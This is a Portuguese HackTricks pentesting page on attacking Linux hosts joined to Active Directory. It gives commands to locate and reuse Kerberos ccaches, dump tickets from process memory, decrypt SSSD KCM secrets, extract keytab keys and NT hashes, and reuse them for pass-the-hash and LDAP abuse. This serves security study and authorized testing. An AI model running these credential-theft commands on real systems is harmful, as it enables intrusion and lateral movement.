# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Uma máquina Linux também pode estar presente em um ambiente do Active Directory.

Uma máquina Linux em um AD pode **armazenar material Kerberos localmente**: ccaches de usuário, keytabs de máquina/serviço e secrets gerenciados pelo SSSD. Esses artefatos geralmente podem ser reutilizados como qualquer outra credencial Kerberos. Para ler a maioria deles, você precisará ser o usuário proprietário do ticket ou **root** na máquina.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## Enumeração

### Enumeração de AD a partir do Linux

Se você tiver acesso a um AD pelo Linux (ou pelo bash no Windows), poderá usar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar o AD.

Você também pode consultar a página a seguir para aprender **outras maneiras de enumerar o AD a partir do Linux**:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

O FreeIPA é uma **alternativa** de código aberto ao **Active Directory** do Microsoft Windows, principalmente para ambientes **Unix**. Ele combina um **diretório LDAP** completo com um Centro de Distribuição de Chaves **Kerberos** do MIT para gerenciamento semelhante ao do Active Directory. Utilizando o **Certificate System** do Dogtag para gerenciamento de certificados de CA e RA, oferece suporte à autenticação **multifator**, incluindo smartcards. O SSSD é integrado para os processos de autenticação Unix.<sup>[[14]](#references)[[15]](#references)</sup> Saiba mais sobre o assunto em:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### Artefatos de hosts ingressados no domínio

Antes de mexer nos tickets, identifique **como o host foi ingressado no AD** e **onde o material Kerberos está realmente armazenado**. Em hosts Linux modernos, isso geralmente é gerenciado por `realmd` + `adcli` + `sssd`, e não apenas por arquivos simples em `/tmp`.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

Isso informa rapidamente se o host confia no AD, se o SSSD está armazenando identidades ou tickets em cache e se **keytabs de máquina/serviço** ou **secrets do KCM** estão disponíveis para abuso.<sup>[[4]](#references)[[10]](#references)</sup>

Trate `/var/lib/sss/db/cache_*.ldb` separadamente dos ccaches do Kerberos e de `/var/lib/sss/secrets/secrets.ldb`. Os arquivos `cache_*.ldb` podem conter verificadores de senha offline quando um domínio tem `cache_credentials = true` **e** o usuário já se autenticou nesse host. Normalmente, só podem ser lidos com acesso privilegiado. A existência de um arquivo de cache ou de uma configuração habilitada, por si só, não comprova que haja uma senha utilizável e atual; examine a configuração efetiva de cada domínio e as identidades realmente armazenadas em cache antes de chegar a essa conclusão. Consulte a [documentação da Red Hat sobre o cache de credenciais do SSSD](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication). Em uma fronteira de identidade separada entre Linux e AD, o [mapeamento de nomes Kerberos entre fornecedores diferentes](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/) só importa quando um serviço aceita o ticket e mapeia seu principal para a conta Unix relevante.

Em um host com `ksu`, um principal Kerberos válido pode acessar uma **conta local de destino**, inclusive root, somente quando essa conta autoriza o principal. A [documentação do MIT Kerberos](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html) descreve os arquivos `.k5login` e `.k5users` no diretório home do destino, bem como o fallback de mapeamento de nomes quando nenhum deles existe. `.k5users` também pode restringir comandos para `ksu -e`; a existência de um arquivo, por si só, não comprova acesso ao shell. Inspecione a conta de destino exata, a propriedade e as permissões dos arquivos, as entradas de autorização legíveis, a credencial Kerberos disponível e as regras de mapeamento efetivas. Se o diretório home de root não puder ser acessado, o estado da autorização permanece desconhecido. A enumeração passiva deve listar esses caminhos e permissões sem solicitar tickets nem executar `ksu`.

Um backup agendado pode criar indiretamente uma fronteira de autorização `.k5login`. Se uma conta com privilégios mais altos copia recursivamente para seu próprio diretório home um diretório gravável por um usuário com menos privilégios, verifique se a cópia inclui arquivos ocultos, se o caminho de destino é o diretório home efetivo da conta e se o arquivo resultante tem uma propriedade aceita pelo serviço de login Kerberos. Por exemplo, a [documentação do rsync](https://download.samba.org/pub/rsync/rsync.1.html) informa que `-a --no-owner` deixa os novos arquivos de destino pertencentes ao usuário que os recebe. A [documentação do MIT Kerberos](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html) explica como um principal listado no `.k5login` desse usuário pode autorizar o acesso. Confirme a identidade RunAs do job agendado, o acesso de escrita à origem, as opções efetivas do rsync, o login com GSSAPI habilitado e um ticket válido para o principal listado; um diretório de origem gravável ou um comando rsync agendado, por si só, não comprova esse caminho.

Um keytab legível também exige uma análise específica por principal. Um keytab que contém um principal com nome de administrador não comprova, por si só, direitos administrativos: a política [`kadm5.acl` do KDC](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html) controla as operações permitidas para o principal. Confirme separadamente o principal, a ACL efetiva e a autorização local de `ksu` ou login antes de considerar o acesso ao keytab uma rota para root. A triagem passiva pode listar o caminho e as permissões do keytab sem usar suas chaves nem contatar o KDC.

## Brincando com tickets

### Pass The Ticket

Nesta página, você encontrará diferentes locais onde pode **encontrar tickets Kerberos em um host Linux**; na página a seguir, você aprenderá a converter esses formatos de tickets CCache para Kirbi (o formato necessário para uso no Windows) e também a realizar um ataque PTT:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

Se quiser conhecer os **fluxos de coleta de tickets específicos do Linux** (`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` etc.), consulte a página dedicada:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### Reutilização de tickets CCACHE de /tmp

Os arquivos CCACHE são formatos binários para **armazenar credenciais Kerberos**. `FILE:/tmp/krb5cc_%{uid}` ainda é comum, mas implantações modernas de Linux também usam `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` ou `KCM:%{uid}`. Verifique a variável de ambiente **`KRB5CCNAME`** e a configuração `default_ccache_name` antes de presumir que os tickets estão em `/tmp`.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### Reutilização de tickets CCACHE a partir do keyring

**Tickets Kerberos armazenados na memória de um processo podem ser extraídos**, especialmente quando a proteção ptrace da máquina está desativada (`/proc/sys/kernel/yama/ptrace_scope`). Uma ferramenta útil para esse fim está disponível em [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey) e facilita a extração ao injetar-se em sessões e despejar os tickets em `/tmp`.<sup>[[1]](#references)[[16]](#references)</sup>

Para configurar e usar essa ferramenta, siga as etapas abaixo:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

Este procedimento tentará injetar em várias sessões, indicando sucesso ao armazenar os tickets extraídos em `/tmp`, seguindo a convenção de nomenclatura `__krb_UID.ccache`.<sup>[[1]](#references)</sup>

### Reutilização de tickets CCACHE do SSSD KCM

O SSSD mantém uma cópia do banco de dados no caminho `/var/lib/sss/secrets/secrets.ldb`. A chave correspondente é armazenada como um arquivo oculto no caminho `/var/lib/sss/secrets/.secrets.mkey`. Por padrão, a chave só pode ser lida com permissões de **root**.<sup>[[4]](#references)</sup>

Invocar **`SSSDKCMExtractor`** com os parâmetros --database e --key analisará o banco de dados e **descriptografará os segredos**.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

O extractor imprime payloads JSON Kerberos brutos; converta-os em um cache de tickets utilizável ou em outro formato de ticket antes das operações pass-the-cache/pass-the-ticket.<sup>[[4]](#references)</sup>

### Triagem rápida de keytab

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### Extrair contas de /etc/krb5.keytab

As chaves de contas de serviço, essenciais para serviços que operam com privilégios de root, são armazenadas com segurança em arquivos **`/etc/krb5.keytab`**. Essas chaves, semelhantes a senhas de serviços, exigem confidencialidade rigorosa.<sup>[[5]](#references)</sup>

Para inspecionar o conteúdo do arquivo keytab, pode-se usar **`klist`**. No Linux, `klist -k -K -e` exibe os principals, os números de versão das chaves, os tipos de criptografia e o material bruto das chaves. Se o tipo de chave for **23 / RC4-HMAC**, o valor da chave também será o **hash NT** daquele principal.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Para usuários Linux, **`KeyTabExtract`** oferece funcionalidade para extrair o hash RC4 HMAC, que pode ser usado para reutilização de hash NTLM. Observe que isso só ajuda quando o keytab ainda contém material **etype 23 / RC4-HMAC**. Em ambientes **somente AES**, talvez não seja possível obter um hash NT reutilizável, mas ainda é possível autenticar diretamente com o keytab via Kerberos.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

No macOS, **`bifrost`** serve como uma ferramenta para análise de arquivos keytab.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

Utilizando as informações extraídas de contas e hashes, é possível estabelecer conexões com servidores usando ferramentas como **`NetExec`**.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### Reutilize a conta da máquina de `/etc/krb5.keytab`

Em sistemas associados ao domínio usando `realmd`/`adcli`/`sssd`, `/etc/krb5.keytab` geralmente contém a **conta do computador** e um ou mais **principals de host/serviço**. Se você tiver **root**, não faça apenas o dump do arquivo: use um dos principals listados por `klist -k` para solicitar um TGT e operar como o próprio host Linux.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

Isso é especialmente útil quando o próprio **objeto de computador** tem direitos delegados no AD ou quando o host tem permissão para recuperar outros secrets, como um **gMSA**.<sup>[[13]](#references)</sup>

### Reutilizar material Kerberos roubado com ferramentas de AD com foco em Linux

Depois de obter um `ccache` válido ou um keytab utilizável, você pode operar diretamente no AD a partir do **Linux**, sem precisar converter tudo primeiro para formatos do Windows. Muitas ferramentas modernas aceitam `KRB5CCNAME` / autenticação Kerberos nativamente.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

Esta é uma boa ponte entre **Linux post-exploitation** e **AD object abuse**. Para conhecer os próprios caminhos de abuso no nível dos objetos, consulte:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Artefatos de gMSA / Managed Service Account no Linux

Implantações recentes de Linux podem consumir **Managed Service Accounts** diretamente do AD. Na prática, isso significa que, após comprometer um servidor Linux, você pode encontrar não apenas o keytab do host, mas também **keytabs específicos de serviço** gerados a partir de uma gMSA. Locais comuns a inspecionar incluem `/etc/gmsad.conf`, arquivos de configuração específicos da implantação e arquivos `*.keytab` adicionais em `/etc`.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

Isso fornece uma identidade Kerberos reutilizável para os SPNs vinculados a essa gMSA **sem tocar em nenhum endpoint Windows**.<sup>[[13]](#references)</sup> Para abuso de gMSA/dMSA **no lado do domínio** após obter privilégios mais altos no AD, consulte:

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Como atacar o Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [Acessando o AD com uma conta de serviço gerenciada – Integrando sistemas RHEL diretamente ao Active Directory](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Variáveis de ambiente do Kerberos – Documentação do MIT Kerberos](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – Documentação do MIT Kerberos](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Tipos de criptografia Kerberos RC4-HMAC usados pelo Microsoft Windows](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Usando Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [Descobrindo e ingressando em domínios de identidade | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [Guia do usuário do bloodyAD](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [Sobre | Documentação do FreeIPA](https://www.freeipa.org/About.html)
- [15] [Notas de lançamento do FreeIPA 4.11.0](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Documentação do kernel Linux](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – Documentação do MIT Kerberos](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
